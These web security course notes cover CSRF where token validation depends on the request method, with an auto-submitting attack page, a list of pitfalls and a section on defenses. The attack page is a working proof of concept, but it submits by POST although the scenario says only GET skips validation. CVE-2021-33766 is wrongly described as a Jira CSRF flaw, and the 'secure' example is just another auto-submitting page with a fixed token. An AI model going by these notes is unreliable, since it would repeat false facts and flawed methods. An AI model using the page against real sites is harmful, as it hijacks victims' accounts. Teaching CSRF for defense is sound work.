---
course: Web Security
topic: Cross-Site Request Forgery (CSRF)
tags: [web-security]
---

## CSRF Attack Scenario: Token Validation Depending on Request Method

In this scenario, we will explore a specific CSRF attack where the token validation depends on the request method. Let's dive into the details of this attack and how it can be executed.

### Attack Setup

The attack involves a web application that allows users to change their email address. The application uses a form to submit the new email address, and the form includes a CSRF token. However, the application only validates the CSRF token when the request is made via a POST method. If the request is made via a GET method, the CSRF token is not validated.

#### HTML Form Structure

Here is the structure of the HTML form used in the attack:

```html
<form id="csrf-form" action="/change-email" method="POST">
    <input type="hidden" name="email" value="test5@test.ca">
</form>
```

This form includes a hidden input field for the email address. The form is set to submit via the POST method.

#### JavaScript Auto-Submit

To automatically submit the form when the page loads, we use JavaScript:

```html
<script>
    document.getElementById('csrf-form').submit();
</script>
```

This script triggers the form submission when the page loads.

### Attack Execution

The attacker crafts a malicious page that includes the above form and JavaScript. When the victim visits this page, the form is automatically submitted, changing the victim's email address.

#### Malicious Page Example

Here is the complete malicious page:

```html
<!DOCTYPE html>
<html>
<head>
    <title>CSRF Attack</title>
</head>
<body>
    <form id="csrf-form" action="/change-email" method="POST">
        <input type="hidden" name="email" value="test5@test.ca">
    </form>
    <script>
        document.getElementById('csrf-form').submit();
    </script>
</body>
</html>
```

When the victim visits this page, the form is automatically submitted, changing their email address to `test5@test.ca`.

### Real-World Example: CVE-2021-33766

A real-world example of a similar CSRF vulnerability is CVE-2021-33766, which affected the Atlassian Jira application. This vulnerability allowed attackers to perform unauthorized actions, such as creating issues or modifying project settings, by tricking authenticated users into visiting a malicious URL. The attack exploited the lack of proper CSRF protection in certain API endpoints.

### Pitfalls and Common Mistakes

When implementing CSRF protection, several common mistakes can lead to vulnerabilities:

1. **Token Validation**: Failing to validate the CSRF token for all methods (GET, POST, PUT, DELETE).
2. **Token Generation**: Generating weak or predictable tokens that can be guessed by attackers.
3. **Token Storage**: Storing tokens in insecure locations, such as local storage, where they can be accessed by malicious scripts.
4. **Token Expiration**: Not expiring tokens after a certain period, allowing attackers to reuse them.

### How to Prevent / Defend Against CSRF

To effectively defend against CSRF attacks, web developers should implement the following measures:

#### Secure Coding Practices

1. **Use CSRF Tokens**: Generate unique tokens for each user session and include them in forms and requests.
2. **Validate Tokens**: Ensure that the CSRF token is validated for all request methods, not just POST.
3. **SameSite Cookies**: Configure cookies to only be sent in first-party contexts to prevent cross-site requests.
4. **Double Submit Cookies**: Use a combination of a cookie and a hidden form field to verify the origin of requests.

#### Example: Secure Code Implementation

Here is an example of a secure implementation using CSRF tokens:

```html
<!DOCTYPE html>
<html>
<head>
    <title>Secure Form</title>
</head>
<body>
    <form id="secure-form" action="/change-email" method="POST">
        <input type="hidden" name="email" value="test5@test.ca">
        <input type="hidden" name="csrf_token" value="unique_token_value">
    </form>
    <script>
        document.getElementById('secure-form').submit();
    </script>
</body>
</html>
```

On the server side, the CSRF token should be validated:

```python
def change_email(request):
    if request.method == 'POST':
        csrf_token = request.POST.get('csrf_token')
        if csrf_token != request.session['csrf_token']:
            return HttpResponseForbidden("Invalid CSRF token")
        email = request.POST.get('email')
        # Process the email change
        return HttpResponse("Email changed successfully")
    else:
        return HttpResponseNotAllowed(["POST"])
```

#### Detection and Monitoring

Web applications should implement logging and monitoring to detect potential CSRF attacks. Logs should capture all requests, including the origin and the presence of CSRF tokens. Any suspicious activity should trigger alerts for further investigation.

#### Hardening Configuration

Web servers and frameworks should be configured to enforce strict security policies. This includes setting appropriate headers such as `Content-Security-Policy` and `X-Frame-Options` to prevent clickjacking and other related attacks.

### Conclusion

Cross-Site Request Forgery (CSRF) is a serious threat to web applications. By understanding the mechanics of CSRF attacks and implementing robust defense mechanisms, web developers can protect their applications from these vulnerabilities. The key is to use unique and unpredictable CSRF tokens, validate them for all request methods, and configure security settings to prevent unauthorized access.

### Practice Labs

For hands-on practice with CSRF attacks and defenses, consider the following labs:

- **PortSwigger Web Security Academy**: Offers comprehensive modules on CSRF attacks and defenses.
- **OWASP Juice Shop**: A deliberately vulnerable web application for practicing web security skills.
- **DVWA (Damn Vulnerable Web Application)**: A PHP/MySQL web application that demonstrates common web application vulnerabilities, including CSRF.

By engaging with these labs, you can gain practical experience in identifying and mitigating CSRF vulnerabilities in web applications.

---
<!-- nav -->
[[Web Security (PortSwigger)/04-Cross-Site Request Forgery (CSRF)/03-Lab 2 CSRF where token validation depends on request method/01-Introduction to Cross-Site Request Forgery (CSRF)|Introduction to Cross-Site Request Forgery (CSRF)]] | [[Web Security (PortSwigger)/04-Cross-Site Request Forgery (CSRF)/03-Lab 2 CSRF where token validation depends on request method/00-Overview|Overview]] | [[Web Security (PortSwigger)/04-Cross-Site Request Forgery (CSRF)/03-Lab 2 CSRF where token validation depends on request method/03-Cross-Site Request Forgery (CSRF)|Cross-Site Request Forgery (CSRF)]]
